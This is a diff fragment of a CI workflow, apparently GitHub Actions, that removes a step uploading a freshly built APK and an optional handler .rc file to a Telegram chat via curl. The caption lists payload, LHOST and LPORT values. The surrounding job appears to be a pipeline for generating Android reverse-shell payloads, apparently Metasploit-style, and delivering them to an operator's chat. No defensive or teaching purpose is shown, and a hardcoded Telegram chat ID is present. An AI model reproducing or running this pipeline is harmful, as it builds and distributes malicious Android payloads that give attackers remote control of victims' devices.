@@ -168,26 +168,4 @@ jobs:
           SEC_CHAT: "6522295816"
           VAR_TOKEN: ${{ vars.TELEGRAM_BOT_TOKEN }}
           VAR_CHAT: ${{ vars.TELEGRAM_CHAT_ID }}
-        run: |
-          set -euo pipefail
-          [ -n "${TG_TOKEN:-}" ] || { echo "::error::TELEGRAM_BOT_TOKEN secret missing"; exit 1; }
-          [ -n "${TG_CHAT:-}" ]  || { echo "::error::TELEGRAM_CHAT_ID secret missing"; exit 1; }
-
-          APK="out/$FNAME"
-          RC="out/handler-$LPORT.rc"
-          test -s "$APK" || { echo "::error::APK missing"; exit 1; }
-          CAPTION=$(printf 'APK ready\npayload: %s\nLHOST: %s\nLPORT: %s\nsize: %s' \
-            "$PAYLOAD" "$LHOST" "$LPORT" "$(du -h "$APK" | cut -f1)")
-
-          curl -sS --fail-with-body \
-            -F "chat_id=${TG_CHAT}" \
-            -F "caption=${CAPTION}" \
-            -F "document=@${APK};type=application/vnd.android.package-archive" \
-            "https://api.telegram.org/bot${TG_TOKEN}/sendDocument"
-
-          if [ "$SEND_RC" = "true" ]; then
-            curl -sS --fail-with-body \
-              -F "chat_id=${TG_CHAT}" \
-              -F "document=@${RC}" \
-              "https://api.telegram.org/bot${TG_TOKEN}/sendDocument"
-          fi
+        run:
